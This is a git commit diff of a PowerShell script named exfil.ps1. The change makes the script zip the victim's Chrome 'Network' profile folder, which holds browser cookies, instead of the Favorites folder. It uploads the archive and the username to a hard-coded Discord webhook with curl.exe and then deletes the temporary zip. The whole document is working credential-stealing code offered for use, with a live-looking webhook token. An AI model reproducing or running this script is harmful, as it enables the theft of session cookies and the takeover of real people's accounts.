05ffe92d109bfb88cbb503ff9706dc770a193b1c
KC1LSR <66142920+KC1LSR@users.noreply.github.com>
2024-10-17 13:23:32 -0400

    exfil.ps1

--- exfil.ps1
+++ exfil.ps1
@@ -1,49 +1,41 @@
-############################################################################################################################################################
+# Define the folder path
+$FolderPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network"
 
-# Get the current user's Favorites folder
-$FavoritesPath = "$env:USERPROFILE\Favorites"
+# Define the name of the zip file
+$ZipFileName = "NetworkData.zip"
+$ZipFilePath = "$env:TEMP\$ZipFileName"
 
-# Set the name for the zip file
-$FolderName = "FavoritesBackup"
-$ZIP = "$FolderName.zip"
+# Compress the folder
+Compress-Archive -Path $FolderPath -DestinationPath $ZipFilePath -Force
 
-# Compress the Favorites folder into a zip
-Compress-Archive -Path $FavoritesPath -DestinationPath $env:tmp/$ZIP
-
-############################################################################################################################################################
-
+# Function to upload the zip file to Discord
 function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0, Mandatory=$True)]
+        [string]$file,
+        [parameter(Position=1, Mandatory=$False)]
+        [string]$text 
+    )
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
+    $hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"
 
-$hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
+    }
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
-};
-
-if (-not ([string]::IsNullOrEmpty($file))){
-    curl.exe -F "file1=@$file" $hookurl
-}
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
 }
 
 # Upload the zip file to Discord
-Upload-Discord -file "$env:tmp/$ZIP"
+Upload-Discord -file $ZipFilePath -text "Here is the compressed Network folder."
 
-############################################################################################################################################################
-
-# Clean up - remove the zip file from temp folder
-Remove-Item "$env:tmp/$ZIP" -Force
-
-############################################################################################################################################################
+# Optionally, clean up the zip file after upload
+Remove-Item $ZipFilePath -Force -ErrorAction SilentlyContinue
